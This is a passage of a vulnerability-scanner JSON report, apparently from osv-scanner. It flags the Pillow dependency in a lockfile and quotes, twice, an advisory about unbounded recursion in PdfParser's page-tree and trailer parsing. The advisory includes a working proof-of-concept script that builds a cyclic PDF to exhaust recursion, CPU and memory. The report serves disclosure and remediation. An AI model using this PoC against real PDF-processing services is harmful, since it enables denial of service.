              "fullDescription": {
                "markdown": "### Summary\nWhen an application appends to an existing PDF with `Image.save(..., format=\"PDF\", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.\n\n### Details\n`linearize_page_tree` recurses on `/Kids` with no cycle or depth check:\n\n- `src/PIL/PdfParser.py:1078-1092`\n\n`read_prev_trailer` catches only a repeated offset:\n\n- `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)\n\n### PoC\n```python\nfrom PIL import PdfParser\n\n# A page tree whose /Pages nodes reference each other in a cycle (2 -\u003e 3 -\u003e 2).\nobjs = {\n    1: b\"\u003c\u003c /Type /Catalog /Pages 2 0 R \u003e\u003e\",\n    2: b\"\u003c\u003c /Type /Pages /Kids [3 0 R] /Count 1 \u003e\u003e\",\n    3: b\"\u003c\u003c /Type /Pages /Kids [2 0 R] /Count 1 \u003e\u003e\",\n}\nbuf = bytearray(b\"%PDF-1.4\\n\")\noff = {}\nfor oid in (1, 2, 3):\n    off[oid] = len(buf)\n    buf += b\"%d 0 obj\\n\" % oid + objs[oid] + b\"\\nendobj\\n\"\nxref = len(buf)\nbuf += b\"xref\\n0 4\\n0000000000 65535 f \\n\"\nbuf += b\"\".join(b\"%010d 00000 n \\n\" % off[o] for o in (1, 2, 3))\nbuf += b\"trailer\\n\u003c\u003c /Root 1 0 R /Size 4 \u003e\u003e\\nstartxref\\n%d\\n%%%%EOF\\n\" % xref\nopen(\"poc.pdf\", \"wb\").write(buf)\n\nPdfParser.PdfParser(\"poc.pdf\", mode=\"r+b\")   # append=True parses the existing file the same way\n```\n\nRun it:\n```\n$ python 11_poc.py\nRecursionError: maximum recursion depth exceeded\n```\n\nThe 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.\n\n### Impact\nA service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.",
                "text": "### Summary\nWhen an application appends to an existing PDF with `Image.save(..., format=\"PDF\", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.\n\n### Details\n`linearize_page_tree` recurses on `/Kids` with no cycle or depth check:\n\n- `src/PIL/PdfParser.py:1078-1092`\n\n`read_prev_trailer` catches only a repeated offset:\n\n- `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)\n\n### PoC\n```python\nfrom PIL import PdfParser\n\n# A page tree whose /Pages nodes reference each other in a cycle (2 -\u003e 3 -\u003e 2).\nobjs = {\n    1: b\"\u003c\u003c /Type /Catalog /Pages 2 0 R \u003e\u003e\",\n    2: b\"\u003c\u003c /Type /Pages /Kids [3 0 R] /Count 1 \u003e\u003e\",\n    3: b\"\u003c\u003c /Type /Pages /Kids [2 0 R] /Count 1 \u003e\u003e\",\n}\nbuf = bytearray(b\"%PDF-1.4\\n\")\noff = {}\nfor oid in (1, 2, 3):\n    off[oid] = len(buf)\n    buf += b\"%d 0 obj\\n\" % oid + objs[oid] + b\"\\nendobj\\n\"\nxref = len(buf)\nbuf += b\"xref\\n0 4\\n0000000000 65535 f \\n\"\nbuf += b\"\".join(b\"%010d 00000 n \\n\" % off[o] for o in (1, 2, 3))\nbuf += b\"trailer\\n\u003c\u003c /Root 1 0 R /Size 4 \u003e\u003e\\nstartxref\\n%d\\n%%%%EOF\\n\" % xref\nopen(\"poc.pdf\", \"wb\").write(buf)\n\nPdfParser.PdfParser(\"poc.pdf\", mode=\"r+b\")   # append=True parses the existing file the same way\n```\n\nRun it:\n```\n$ python 11_poc.py\nRecursionError: maximum recursion depth exceeded\n```\n\nThe 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.\n\n### Impact\nA service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112895](https://osv.dev/CVE-2026-112895)**.\n\n## [GHSA-p4wg-p73j-c528](https://osv.dev/GHSA-p4wg-p73j-c528)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e When an application appends to an existing PDF with `Image.save(..., format=\"PDF\", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.\n\u003e \n\u003e ### Details\n\u003e `linearize_page_tree` recurses on `/Kids` with no cycle or depth check:\n\u003e \n\u003e - `src/PIL/PdfParser.py:1078-1092`\n\u003e \n\u003e `read_prev_trailer` catches only a repeated offset:\n\u003e \n\u003e - `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)\n\u003e \n\u003e ### PoC\n\u003e ```python\n\u003e from PIL import PdfParser\n\u003e \n\u003e # A page tree whose /Pages nodes reference each other in a cycle (2 -\u003e 3 -\u003e 2).\n\u003e objs = {\n\u003e     1: b\"\u003c\u003c /Type /Catalog /Pages 2 0 R \u003e\u003e\",\n\u003e     2: b\"\u003c\u003c /Type /Pages /Kids [3 0 R] /Count 1 \u003e\u003e\",\n\u003e     3: b\"\u003c\u003c /Type /Pages /Kids [2 0 R] /Count 1 \u003e\u003e\",\n\u003e }\n\u003e buf = bytearray(b\"%PDF-1.4\\n\")\n\u003e off = {}\n\u003e for oid in (1, 2, 3):\n\u003e     off[oid] = len(buf)\n\u003e     buf += b\"%d 0 obj\\n\" % oid + objs[oid] + b\"\\nendobj\\n\"\n\u003e xref = len(buf)\n\u003e buf += b\"xref\\n0 4\\n0000000000 65535 f \\n\"\n\u003e buf += b\"\".join(b\"%010d 00000 n \\n\" % off[o] for o in (1, 2, 3))\n\u003e buf += b\"trailer\\n\u003c\u003c /Root 1 0 R /Size 4 \u003e\u003e\\nstartxref\\n%d\\n%%%%EOF\\n\" % xref\n\u003e open(\"poc.pdf\", \"wb\").write(buf)\n\u003e \n\u003e PdfParser.PdfParser(\"poc.pdf\", mode=\"r+b\")   # append=True parses the existing file the same way\n\u003e ```\n\u003e \n\u003e Run it:\n\u003e ```\n\u003e $ python 11_poc.py\n\u003e RecursionError: maximum recursion depth exceeded\n\u003e ```\n\u003e \n\u003e The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.\n\u003e \n\u003e ### Impact\n\u003e A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-p4wg-p73j-c528 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112895\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112895](https://osv.dev/CVE-2026-112895)**.\n\n## [GHSA-p4wg-p73j-c528](https://osv.dev/GHSA-p4wg-p73j-c528)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e When an application appends to an existing PDF with `Image.save(..., format=\"PDF\", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.\n\u003e \n\u003e ### Details\n\u003e `linearize_page_tree` recurses on `/Kids` with no cycle or depth check:\n\u003e \n\u003e - `src/PIL/PdfParser.py:1078-1092`\n\u003e \n\u003e `read_prev_trailer` catches only a repeated offset:\n\u003e \n\u003e - `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)\n\u003e \n\u003e ### PoC\n\u003e ```python\n\u003e from PIL import PdfParser\n\u003e \n\u003e # A page tree whose /Pages nodes reference each other in a cycle (2 -\u003e 3 -\u003e 2).\n\u003e objs = {\n\u003e     1: b\"\u003c\u003c /Type /Catalog /Pages 2 0 R \u003e\u003e\",\n\u003e     2: b\"\u003c\u003c /Type /Pages /Kids [3 0 R] /Count 1 \u003e\u003e\",\n\u003e     3: b\"\u003c\u003c /Type /Pages /Kids [2 0 R] /Count 1 \u003e\u003e\",\n\u003e }\n\u003e buf = bytearray(b\"%PDF-1.4\\n\")\n\u003e off = {}\n\u003e for oid in (1, 2, 3):\n\u003e     off[oid] = len(buf)\n\u003e     buf += b\"%d 0 obj\\n\" % oid + objs[oid] + b\"\\nendobj\\n\"\n\u003e xref = len(buf)\n\u003e buf += b\"xref\\n0 4\\n0000000000 65535 f \\n\"\n\u003e buf += b\"\".join(b\"%010d 00000 n \\n\" % off[o] for o in (1, 2, 3))\n\u003e buf += b\"trailer\\n\u003c\u003c /Root 1 0 R /Size 4 \u003e\u003e\\nstartxref\\n%d\\n%%%%EOF\\n\" % xref\n\u003e open(\"poc.pdf\", \"wb\").write(buf)\n\u003e \n\u003e PdfParser.PdfParser(\"poc.pdf\", mode=\"r+b\")   # append=True parses the existing file the same way\n\u003e ```\n\u003e \n\u003e Run it:\n\u003e ```\n\u003e $ python 11_poc.py\n\u003e RecursionError: maximum recursion depth exceeded\n\u003e ```\n\u003e \n\u003e The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.\n\u003e \n\u003e ### Impact\n\u003e A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-p4wg-p73j-c528 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112895\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
